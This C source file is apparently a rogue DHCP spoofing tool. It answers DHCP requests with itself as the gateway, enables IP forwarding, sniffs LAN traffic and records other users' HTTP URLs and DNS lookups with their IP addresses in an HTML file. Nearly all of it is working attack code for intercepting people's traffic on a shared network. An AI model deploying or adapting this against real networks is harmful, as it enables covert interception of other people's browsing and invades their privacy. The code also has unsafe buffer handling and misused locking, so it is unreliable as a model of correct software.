#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <stdlib.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdarg.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <dns_util.h>
#include <pthread.h>
#include <sys/types.h>
#include <resolv.h>

#include "dhcp.h"
#include "util.h"
#include "ippool.h"
#include "ethernet.h"
#include "http.h"

// Transport Layer protocol numbers
#define TCP_PROT 0x6
#define UDP_PROT 0x11

// Application Layer port numbers
#define HTTP_PORT 80
#define DNS_PORT 53


// HTTP Max Url Length
#define MAX_URL_L 2048

// DNS Query Name Max Length
#define MAX_QR_L 512

char ifa_name[IFNAMSIZ + 1];

struct in_addr my_ip;
struct in_addr lst_ip;
struct in_addr brd_addr;
struct in_addr sub_addr;
struct in_addr dns_addr;
char srv_hst_name[] = "NOT-A-ROUTER";
char dns_srv_addr[] = "8.8.8.8"; // Google Public DNS Server will be used as it's always avaiable
uint32_t cur_ip = 40;

// A mutex to be used for writing to the file that contains all urls
pthread_mutex_t url_file_mutex;
char url_to_file[MAX_URL_L];
FILE* url_fp;

/// Returns the next ip for the network
in_addr_t get_cur_ip() {
	in_addr_t ret_v = ((my_ip.s_addr & sub_addr.s_addr)) + htonl(cur_ip);
	//d_printf("get_cur_ip() = 0x%08x\n", ret_v);
	return ret_v;
}

/// Alloc & Initialze objects.
/// Perform Initial Setup of the program
void init(void) {
	d_printf("Initializing\n");

	// Enabling Ip-Forwarding
	#ifdef __linux__
		system("echo 1 > /proc/sys/net/ipv4/ip_forward");
	#elif __APPLE__
		system("sysctl -w net.inet.ip.forwarding=1");
	#endif

	// Gets the local interface ip address
	struct ifaddrs *addrs, *it;
	getifaddrs(&addrs);
	it = addrs;
	memset(ifa_name, 0, IFNAMSIZ + 1);
	while(it) {
		if( it->ifa_addr && it->ifa_addr->sa_family == AF_INET && strstr(it->ifa_name, "lo") == 0 ) {
			struct sockaddr_in *sock_addr = (struct sockaddr_in *)it->ifa_addr;
			struct sockaddr_in *sock_brd_addr = (struct sockaddr_in *)it->ifa_broadaddr;
			struct sockaddr_in *sock_sub_addr = (struct sockaddr_in *)it->ifa_netmask;
			my_ip = sock_addr->sin_addr;
			brd_addr = sock_brd_addr->sin_addr;
			sub_addr = sock_sub_addr->sin_addr;
			strcpy(ifa_name, it->ifa_name);
			d_printf("My Ip Address: %s\n", inet_ntoa(sock_addr->sin_addr));
			d_printf("Brodcast Address For the Network: %s\n", inet_ntoa(sock_brd_addr->sin_addr));
			d_printf("Subnet Mask: %s\n", inet_ntoa(sock_sub_addr->sin_addr));
			d_printf("Interface Name: %s\n", ifa_name);
			break;
		}
		it = it->ifa_next;
	}
	freeifaddrs(addrs);

	// Initialization to get DNS Server Ip
	dns_addr.s_addr = inet_addr(dns_srv_addr);
	d_printf("DNS Server Ip: %s\n", inet_ntoa(dns_addr));

	// Initialization of the Custom Ethernet
	d_printf("Ethernet Initialization\n");
	eth_init();

	d_printf("Done - Initialization\n");
}

/// Dealloc objects
/// Perform deinitialization for the objects
void deinit(void) {
	d_printf("Deinitializing\n");
}

/// This should perform the DHCP Spoofing
void* init_DHCP_server(void* arg) {

	d_printf("DHCP Init\n");

	dhcp_hdr i_hdr, o_hdr;
	dhcp_opt i_opt, o_opt;
	in_addr_t i_addr;
	in_addr_t o_addr;
	while(1) {
		// Default Values
		memset(&i_hdr, 0, sizeof(i_hdr));
		memset(&i_opt, 0, sizeof(i_opt));
		memset(&o_hdr, 0, sizeof(o_hdr));
		memset(&o_opt, 0, sizeof(o_opt));

		d_printf("Waiting DHCP Packages\n");

		// Gets a dhcp package from the network
		i_addr = wait_dhcp_hdr(&i_hdr);

		// Get Options from Header
		set_dhcp_opt_from_dhcp_hdr(&i_opt, &i_hdr);

		switch(i_opt.dhcp_msg) {
			case DISCOVER:
				printf("Discover\n");
				// Header
				o_hdr.opcode = 0x2; 		// Reply
				o_hdr.hrd_t = 1; 		// Ethernet
				o_hdr.hrd_addr_l = ETHER_ADDR_L;// 6 Bytes
				o_hdr.hop_c = 0;
				o_hdr.trs_id = i_hdr.trs_id;	// Transactio ID from the captured package
				o_hdr.num_s = 0;
				o_hdr.flags = i_hdr.flags;	// Flags from the client
				o_hdr.clt_ip = 0;
				o_hdr.own_ip = get_cur_ip(); // Static Value for Now
				o_hdr.srv_ip = my_ip.s_addr;
				o_hdr.gtw_ip = my_ip.s_addr;
				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);

				// Options
				o_opt.dhcp_msg = OFFER;
				o_opt.ip_lease_time = 10000;
				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
				memcpy(o_opt.dns_id, &dns_addr.s_addr, IP_ADDR_L);
				o_opt.rnw_time = 10000;
				o_opt.rbn_time = 10000;

				// Sets the flags for the header
				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);

				// Sends the package
				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);

				// Sets the transaction id for the ip
				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);
				break;
			case OFFER:
				printf("Offer\n");
				break;
			case REQUEST:
				o_addr = get_ip_for_trs_id(i_hdr.trs_id);

				// Header
				o_hdr.opcode = 0x2; 		// Reply
				o_hdr.hrd_t = 1;		// Ethernet
				o_hdr.hrd_addr_l = ETHER_ADDR_L;// 6 bytes
				o_hdr.hop_c = 0;
				o_hdr.trs_id = i_hdr.trs_id;	// Transaction id
				o_hdr.num_s = 0;
				o_hdr.flags = i_hdr.flags;	// Flags from the client
				o_hdr.clt_ip = i_hdr.clt_ip;
				o_hdr.own_ip =  o_addr == 0 ? get_cur_ip() : o_addr;
				o_hdr.srv_ip = my_ip.s_addr;
				o_hdr.gtw_ip = my_ip.s_addr;
				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);

				// Options
				o_opt.dhcp_msg = ACK;
				o_opt.ip_lease_time = 10000;
				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
				memcpy(o_opt.dns_id, &dns_addr.s_addr, IP_ADDR_L);
				o_opt.rnw_time = 10000;
				o_opt.rbn_time = 10000;

				// Gather the flags from the header
				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);

				// Sends the package
				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);

				// Sets the transaction id for the ip
				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);

				cur_ip++;
				printf("Request\n");
				break;
			case DECLINE:
				printf("Decline\n");
				break;
			case ACK:
				printf("Ack\n");
				break;
			case NAK:
				printf("Nak\n");
				break;
			case RELEASE:
				printf("Release\n");
				break;
			case INFORM:
				printf("Inform\n");
				break;
			case INVALID:
				printf("Invalid\n");
				break;
		}
	}
	return NULL;
}

void append_url_to_file(char* url) {
	strcpy(url_to_file, url);
	pthread_mutex_unlock(&url_file_mutex);
	printf("saving url http://%s - ip: %s\n", url, inet_ntoa(lst_ip));
}

//Monitor the HTTP network traffic
void init_sniffer() {

	d_printf("Initializing Sniffer\n");
	// Begin listening for Ethernet Frames
	d_printf("Ethernet Payload Length: %u\n", ETHER_MAX_LEN - ETHER_HDR_LEN);
	eth_frm *frame = calloc(sizeof(struct ether_header) + ETHER_MAX_LEN - ETHER_HDR_LEN, 1);
	while(1) {

		size_t read_bytes = wait_eth_frame(&frame);
		//d_printf("0x%x bytes\n", read_bytes);
		d_printf("{Ethernet");
		if( ntohs(frame->hdr.ether_type) == ETHERTYPE_IP ) {
				struct ip *iphdr = (struct ip*)frame->payload;
				d_printf("-Ip");
				lst_ip = iphdr->ip_src;
				/*if( strcmp(inet_ntoa(iphdr->ip_src), inet_ntoa(my_ip)) == 0 ) {
					d_printf("-");
				}else */if( iphdr->ip_p == TCP_PROT ) {
					struct tcphdr* tcp = (struct tcphdr*)(frame->payload + sizeof(struct ip));
					d_printf("-TCP");
					d_printf("(s:%u, d:%u)", ntohs(tcp->th_sport), ntohs(tcp->th_dport));
					uint8_t tcphdr_l = tcp->th_off*4;
					if( ntohs(tcp->th_dport) == HTTP_PORT ) {
							d_printf("-HTTP");
							char *http_buf = (char*)(frame->payload + sizeof(struct ip) + tcphdr_l );
							char url[MAX_URL_L];
							if( set_addr_from_get_buf(url, http_buf) != 0 ) {
								d_printf("%s", url);
								append_url_to_file(url);
							}else{
								d_printf("-*");
							}
					}else{
						d_printf("-*");
					}
				}else if( iphdr->ip_p == UDP_PROT  ) {
					struct udphdr* udp = (struct udphdr*)(frame->payload + sizeof(struct ip));
					d_printf("-UDP");
					d_printf("(s:%u, d:%u)", ntohs(udp->uh_sport), ntohs(udp->uh_dport));
					if( ntohs(udp->uh_dport) == DNS_PORT ) {
						dns_header_t* dns = (dns_header_t*)(frame->payload + sizeof(struct ip) + sizeof(struct udphdr));
						d_printf("-DNS");
						d_printf("-%s", (ntohs(dns->flags) & 0x8000) == 0 ? "Query" : "Response");
						if( (ntohs(dns->flags) & 0x8000) == 0 ) { // Query
							char url[MAX_QR_L];
							memset(url, 0, MAX_QR_L);
							uint8_t* ptr = (uint8_t*)(frame->payload + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(dns_header_t));
							while (*ptr != 0) {
								uint8_t len = *ptr;
								memcpy(url + strlen(url), ptr + 1, len);
								url[strlen(url)] = '.';
								ptr += len + 1;
							}
							url[strlen(url) - 1] = '\0';
							d_printf("[where is %s?]", url);
							append_url_to_file(url);
						}
					}else{
						d_printf("-*");
					}
				}else{
					d_printf("-*");
				}
		}else{
			d_printf("-*");
		}
		d_printf("} - %u\n", read_bytes);
	}
}

void* init_url_thread(void* arg) {
	url_fp = fopen("urls.htm", "a");
	if( !url_fp ) {
		d_printf("Error while creating file for the urls\n");
		return NULL;
	}
	d_printf("waiting urls\n");
	while (1) {
		pthread_mutex_lock(&url_file_mutex);
		fprintf(url_fp, "<li><a href=\"http://%s\">%s</a> - %s</li>\n ", url_to_file, url_to_file, inet_ntoa(lst_ip));
		fflush(url_fp);
	}
	return NULL;
}

int main(int argc, char** argv) {
	// Gets Initial Flags
	get_initial_flags(argc, argv);

	// Initialization
	init();

	// Register exit function
	atexit(deinit);

	pthread_t dhcp_thread;
	pthread_t url_thread;

	if( pthread_create(&dhcp_thread, NULL, &init_DHCP_server, NULL) != 0 ) {
		d_printf("pthread_create(dhcp_thread)\n");
	}

	pthread_mutex_init(&url_file_mutex, NULL);
	pthread_mutex_lock(&url_file_mutex);
	if( pthread_create(&url_thread, NULL, &init_url_thread, NULL) != 0 ) {
		d_printf("pthread_create(url_thread)\n");
	}

	init_sniffer();

	// End of program
	exit(EXIT_SUCCESS);
}
